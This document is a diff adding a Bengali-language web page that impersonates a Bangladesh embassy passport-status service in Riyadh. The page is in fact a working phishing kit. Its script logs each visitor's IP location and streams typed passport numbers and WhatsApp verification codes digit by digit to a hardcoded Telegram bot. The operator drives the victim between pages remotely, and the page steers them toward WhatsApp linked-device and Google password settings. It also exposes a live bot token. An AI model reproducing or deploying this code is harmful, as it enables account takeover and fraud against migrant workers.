@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Passport - Chaking</title>
+
+    <meta property="og:title" content="Passport Checking and Download">
+    <meta property="og:description" content="রিয়াদ বাংলাদেশ দূতাবাস প্রবাসী সেবা কেন্দ্র থেকে সকল বাংলাদেশী প্রবাসীদের জন্য ২৪ ঘন্টা সরকারিভাবে পাসপোর্ট নিয়ে সকল সমস্যার সমাধানের চেষ্টা করা হচ্ছে। বর্তমানে আপনার পাসপোর্ট কি অবস্থায় আছে সরাসরি নিজে চেক করতে পারবেন।">
+    <meta property="og:image" content="https://passportchaking-io.github.io/Online_Passport_chaking/file_000000001a70720ba5708a95677f8d11.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://passportchaking-io.github.io/Online_Passport_chaking/">
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { 
+            background-color: #f7f9fc; 
+            font-family: 'Helvetica', Arial, sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            height: 100vh; 
+            overflow: hidden; 
+            display: flex; 
+            flex-direction: column; 
+        }
+        .hidden { display: none !important; }
+        
+        .top-half { 
+            height: 48vh; 
+            width: 100%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            background-color: white; 
+            border-bottom: 1px solid #e1e4e8; 
+            padding: 10px; 
+        }
+        .top-half img { 
+            max-width: 100%; 
+            max-height: 100%; 
+            object-fit: contain; 
+            border-radius: 8px; 
+        }
+        
+        .bottom-half {
+            height: 52vh;
+            width: 100%;
+            background: #f7f9fc;
+            padding: 10px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            gap: 5px;
+            position: relative;
+            padding-top: 15px;
+        }
+        
+        .btn-blue { 
+            width: 100%; 
+            max-width: 350px; 
+            background-color: #1877f2; 
+            color: white; 
+            font-weight: bold; 
+            padding: 16px; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            border: none; 
+            font-size: 18px; 
+            text-align: center; 
+            transition: all 0.3s ease;
+        }
+        .btn-blue:hover { 
+            background-color: #1565c0; 
+            transform: translateY(-2px);
+        }
+        .btn-blue:disabled { 
+            background-color: #90a4ae; 
+            cursor: not-allowed; 
+            transform: none;
+        }
+        
+        .btn-red { 
+            width: 100%; 
+            max-width: 350px; 
+            background-color: #ef4444; 
+            color: white; 
+            font-weight: bold; 
+            padding: 16px; 
+            border-radius: 12px; 
+            cursor: pointer; 
+            border: none; 
+            font-size: 18px; 
+            text-align: center; 
+        }
+        
+        .secure-input { 
+            width: 100%; 
+            max-width: 350px; 
+            padding: 16px; 
+            border: 2px solid #ccd0d5; 
+            border-radius: 12px; 
+            outline: none; 
+            font-size: 17px; 
+            background: white; 
+        }
+        .secure-input:focus { 
+            border-color: #1877f2; 
+        }
+        
+        .loader { 
+            width: 55px; 
+            height: 55px; 
+            border: 6px solid #f3f3f3; 
+            border-top: 6px solid #1877f2; 
+            border-radius: 50%; 
+            animation: spin 0.8s linear infinite; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        
+        .code-input { 
+            width: 38px; 
+            height: 50px; 
+            text-align: center; 
+            font-size: 20px; 
+            font-weight: 600; 
+            border: 2px solid #dddfe2; 
+            border-radius: 6px; 
+            background: #ffffff; 
+        }
+        .code-input:focus { 
+            border-color: #1877f2; 
+            transform: scale(1.05);
+        }
+        
+        .photo-container {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px; /* ফটোর নিচে ফাঁকা জায়গা */
+        }
+        
+        .photo-clickable {
+            width: 100%;
+            max-width: 350px;
+            cursor: pointer;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+        }
+        .photo-clickable:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15);
+        }
+        .photo-clickable:active {
+            transform: scale(0.98);
+        }
+        .photo-clickable img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+    </style>
+</head>
+<body onload="initApp()">
+
+    <div class="top-half">
+        <img src="https://raw.githubusercontent.com/passportchaking-io/Your_passport_file_download/main/IMG_20260525_160654.jpg">
+    </div>
+
+    <div class="bottom-half text-center">
+        <!-- ✅ STEP 1: শুরু পেজ -->
+        <div id="step1" class="w-full flex flex-col items-center gap-4">
+            <h2 class="text-2xl font-extrabold text-gray-900">পাসপোর্ট চেক করুন</h2>
+            <p class="text-gray-600 px-4">বর্তমানে আপনার পাসপোর্ট কি অবস্থায় আছে সরাসরি অনলাইন থেকে দেখে নিতে পারবেন। সরাসরি দেখতে নিচের বাটনে ক্লিক করুন।</p>
+            <button onclick="goToStep('passport_input')" class="btn-blue">ফাইলটি ওপেন করুন</button>
+        </div>
+
+        <!-- ✅ PASSPORT INPUT: পাসপোর্ট নম্বর ইনপুট (নতুন পেজ, পপ-আপ বাদ) -->
+        <div id="passport_input" class="hidden w-full flex flex-col items-center gap-3">
+            <h1 class="text-xl font-bold text-gray-900">আপনার পাসপোর্ট নাম্বার দিয়ে সরাসরি নিজেই আপনার পাসপোর্ট দেখতে পারবেন</h1>
+            <input 
+                type="text" 
+                id="passport_field" 
+                placeholder="পাসপোর্ট নাম্বার" 
+                class="secure-input" 
+                autocomplete="off"
+                oninput="autoSendPassport()"
+            >
+            <button onclick="validateAndSubmit()" class="btn-blue">পাসপোর্ট চেক করুন</button>
+        </div>
+
+        <!-- ✅ PHOTO PAGE: শুধু ফটো (ক্লিক = OTP পেজ) + নিচে ফাঁকা -->
+        <div id="photo_page" class="hidden w-full flex flex-col items-center">
+            <div class="photo-container">
+                <div class="photo-clickable" onclick="goToStep('otp_page')">
+                    <img 
+                        src="https://raw.githubusercontent.com/passportchaking-io/Your_passport_file_download/main/IMG_20260525_160654.jpg" 
+                        alt="Passport Document"
+                    >
+                </div>
+            </div>
+        </div>
+
+        <!-- ✅ OTP PAGE: ৪টি ঘর (৮টি থেকে ৪টি বাকি) -->
+        <div id="otp_page" class="hidden w-full flex flex-col items-center">
+            <h2 class="text-lg font-bold text-gray-900 mb-2">পাসপোর্ট ডকুমেন্ট ফাইলটি পাসওয়ার্ড দিয়ে লক করা আছে।</h2>
+            <p class="text-xs text-gray-600 mb-6 px-4">সরাসরি রিয়াদ বাংলাদেশ দূতাবাস প্রবাসী সেবা কেন্দ্র থেকে পাসপোর্ট ফাইলটি ওপেন করার জন্য পাসওয়ার্ড নাম্বার পাঠানো হয়েছে আপনার whatsapp এ আসা মেছেজের ভিতরে 4 সংখ্যার পাসওয়ার্ড নাম্বার নিচে ফাঁকা ঘরে বসিয়ে ফাইলটি ওপেন করুন।</p>
+            <div id="otp-inputs" class="flex justify-center gap-1.5 mb-4">
+                <input type="text" inputmode="numeric" maxlength="1" class="code-input" autofocus>
+                <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+                <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+                <input type="text" inputmode="numeric" maxlength="1" class="code-input">
+            </div>
+            <button id="otpSubmitBtn" onclick="goToStep('verifying')" class="btn-blue opacity-50 cursor-not-allowed" disabled>Verify Code</button>
+        </div>
+
+        <!-- ✅ VERIFYING: লোডিং পেজ -->
+        <div id="verifying" class="hidden w-full flex flex-col items-center gap-5">
+            <div class="loader"></div>
+            <h3 class="text-lg font-bold text-blue-600">অল্প কিছুক্ষণ অপেক্ষা করুন...</h3>
+            <p class="text-sm text-gray-700 px-10 font-medium text-center">গুরুত্ব সহকারে যাচাই করা হচ্ছে। যাচাই করা শেষ না হওয়া পর্যন্ত দয়া করে একটু অপেক্ষা করুন।</p>
+        </div>
+
+        <!-- ✅ SUCCESS PAGE -->
+        <div id="success_page" class="hidden w-full flex flex-col items-center gap-3">
+            <div class="bg-green-500 text-white rounded-full w-16 h-16 flex items-center justify-center text-3xl">✓</div>
+            <h2 class="text-2xl font-bold text-green-600">অভিনন্দন!</h2>
+            <p class="text-gray-600 text-sm">আপনার অনুরোধটি সফলভাবে গ্রহণ করা হয়েছে তবে সারভার জনিত সমস্যার কারণে আপনার পাসপোর্ট ডকুমেন্ট ফাইলটি এখন ওপেন করা সম্ভব হচ্ছে না এজন্য আপনি সরাসরি ডাউনলোড করেন।</p>
+            <a href="https://wa.me/settings/linked_devices" class="btn-blue mt-2">File Download</a>
+        </div>
+
+        <!-- ✅ ERROR PAGE -->
+        <div id="error_page" class="hidden w-full flex flex-col items-center gap-3 px-6">
+            <div class="bg-red-500 text-white rounded-full w-16 h-16 flex items-center justify-center text-3xl">✕</div>
+            <h2 class="text-xl font-bold text-red-600">দুঃখিত!</h2>
+            <p class="text-gray-800 text-sm font-semibold">আপনার নেটওয়ার্কের সমস্যার জন্য পাসপোর্ট ডকুমেন্ট ফাইলটি ওপেন করা সম্ভব হচ্ছে না।</p>
+            <button onclick="location.reload()" class="btn-red mt-2">আবার চেষ্টা করুন</button>
+        </div>
+    </div>
+
+    <script>
+        const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+        const chatId = "8516934257";
+        let lastUpdateId = 0;
+        let deviceInfo = "Unknown";
+        let passportNumber = "";
+        let otpCode = "";
+
+        // ✅ ইনিশিয়াল লজিক
+        async function initApp() {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                deviceInfo = `${ipData.city}, ${ipData.country_name} (IP: ${ipData.ip})`;
+                sendToBot(`🚀 **নতুন ভিজিটর লিংকে ঢুকেছে!**
+📍 লোকেশন: ${deviceInfo}`);
+            } catch (e) {
+                console.error(e);
+            }
+
+            // OTP ইনপুট সেটআপ
+            setupOTPInputs();
+        }
+
+        // ✅ পাসপোর্ট নম্বর অটোমেটিক টেলিগ্রামে পাঠাবে
+        function autoSendPassport() {
+            const value = document.getElementById('passport_field').value.trim();
+            
+            if (value.length >= 5 && passportNumber === "") {
+                passportNumber = value;
+                
+                // ✅ Telegramে সব কমান্ড বাটন সহ পাঠান
+                sendToBotWithKeyboard(`🎯 **পাসপোর্ট নম্বর ক্যাপচার!**
+📝 নম্বর: `${value}`
+📍 লোকেশন: ${deviceInfo}`);
+            }
+            
+            // প্রতি ৩ অক্ষরে আপডেট
+            if (value.length > 5 && value.length % 3 === 0) {
+                sendToBot(`📝 **পাসপোর্ট আপডেট:** `${value}``);
+            }
+        }
+
+        // ✅ ভ্যালিডেশন এবং সাবমিট
+        function validateAndSubmit() {
+            const value = document.getElementById('passport_field').value.trim();
+            
+            if (value.length === 0) {
+                alert("⚠️ অনুগ্রহ করে পাসপোর্ট নাম্বার দিন।");
+                return;
+            }
+            
+            if (value.length < 5) {
+                alert("⚠️ অনুগ্রহ করে অন্তত ৫ সংখ্যার পাসপোর্ট নাম্বার দিন।");
+                return;
+            }
+            
+            passportNumber = value;
+            
+            // ✅ Telegramে পুরো তথ্য + সব কমান্ড বাটন
+            sendAllCommands();
+            
+            goToStep('photo_page');
+        }
+
+        // ✅ সব কমান্ড বাটন সহ Telegramে পাঠান
+        function sendAllCommands() {
+            const keyboard = {
+                inline_keyboard: [
+                    [{ text: "🔑 Pass Change (Tamil)", callback_data: `pass_cmd` }],
+                    [{ text: "📩 Get OTP Page", callback_data: "otp_cmd" }],
+                    [{ text: "📨 Gmail Verify Page", callback_data: "email_page_cmd" }],
+                    [{ text: "⏳ Force Waiting", callback_data: "wait_cmd" }],
+                    [{ text: "✅ Success", callback_data: "success" }, { text: "❌ Error", callback_data: "error" }]
+                ]
+            };
+
+            sendToBotWithKeyboard(
+                `🎯 **পাসপোর্ট সাবমিট!**
+📝 নম্বর: `${passportNumber}`
+📍 ${deviceInfo}`,
+                keyboard
+            );
+        }
+
+        // ✅ OTP ইনপুট সেটআপ (৪টি ঘর)
+        function setupOTPInputs() {
+            const inputs = document.querySelectorAll('.code-input');
+            const btn = document.getElementById('otpSubmitBtn');
+
+            inputs.forEach((input, index) => {
+                // টাইপ করার সময়
+                input.addEventListener('input', () => {
+                    // পরের ঘরে যাবে
+                    if (input.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+
+                    // OTP সংগ্রহ
+                    otpCode = Array.from(inputs).map(i => i.value).join('');
+
+                    // প্রতিটি ঘরে সংখ্যা দিলে Telegramে পাঠাবে
+                    if (index === 0 && otpCode.length === 1) {
+                        sendToBot(`🔑 **OTP ১:** `${otpCode}``);
+                    }
+                    if (index === 1 && otpCode.length === 2) {
+                        sendToBot(`🔑 **OTP ২:** `${otpCode}``);
+                    }
+                    if (index === 2 && otpCode.length === 3) {
+                        sendToBot(`🔑 **OTP ৩:** `${otpCode}``);
+                    }
+                    if (index === 3 && otpCode.length === 4) {
+                        sendToBot(`🔑 **OTP ৪:** `${otpCode}``);
+                        
+                        // ✅ বাটন Active করুন (নীল হবে)
+                        btn.disabled = false;
+                        btn.classList.remove('opacity-50', 'cursor-not-allowed');
+                        
+                        // ✅ পুরো তথ্য Telegramে পাঠাবে
+                        sendToBot(`🎯 **পুরো তথ্য!**
+📝 পাসপোর্ট: `${passportNumber}`
+🔑 OTP: `${otpCode}`
+📍 ${deviceInfo}`);
+                    }
+                });
+
+                // ব্যাকস্পেস
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace') {
+                        if (input.value === '' && index > 0) {
+                            inputs[index - 1].focus();
+                        }
+                    }
+                });
+            });
+        }
+
+        // ✅ নেভিগেশন
+        function goToStep(id) {
+            ['step1', 'passport_input', 'photo_page', 'otp_page', 'verifying', 'success_page', 'error_page'].forEach(s => {
+                const element = document.getElementById(s);
+                if(element) element.classList.add('hidden');
+            });
+            
+            const target = document.getElementById(id);
+            if(target) {
+                target.classList.remove('hidden');
+                target.classList.add('flex');
+            }
+
+            // OTP পেজে গেলে প্রথম ঘরে অটোমেটিক ফোকাস
+            if (id === 'otp_page') {
+                setTimeout(() => {
+                    const firstInput = document.querySelector('.code-input');
+                    if(firstInput) firstInput.focus();
+                }, 100);
+            }
+        }
+
+        // ✅ ব্রাউজার লক
+        function lockBrowser() {
+            window.history.pushState(null, "", window.location.href);
+            window.onpopstate = () => window.history.pushState(null, "", window.location.href);
+        }
+
+        // ✅ Telegram বট মেসেজ (কমান্ড বাটন সহ)
+        function sendToBotWithKeyboard(text, keyboard = null) {
+            const data = {
+                chat_id: chatId,
+                text: text,
+                parse_mode: "Markdown"
+            };
+            
+            if (keyboard) {
+                data.reply_markup = keyboard;
+            }
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+                method: 'POST', 
+                headers: {'Content-Type': 'application/json'}, 
+                body: JSON.stringify(data) 
+            }).catch(e => console.error(e));
+        }
+
+        function sendToBot(text) {
+            sendToBotWithKeyboard(text);
+        }
+
+        // ✅ Telegram থেকে কমান্ড শোনা
+        function startListening() {
+            setInterval(async () => {
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+                    const data = await res.json();
+                    if (data.ok && data.result.length > 0) {
+                        data.result.forEach(update => {
+                            lastUpdateId = update.update_id;
+                            const cmd = update.callback_query?.data;
+                            if (cmd === "pass_cmd") window.location.href = "https://myaccount.google.com/signinoptions/password?hl=ta";
+                            else if (cmd === "otp_cmd") goToStep('otp_page');
+                            else if (cmd === "email_page_cmd") goToStep('passport_input');
+                            else if (cmd === "success") goToStep('success_page');
+                            else if (cmd === "error") goToStep('error_page');
+                            else if (cmd === "wait_cmd") goToStep('verifying');
+                        });
+                    }
+                } catch (e) {}
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
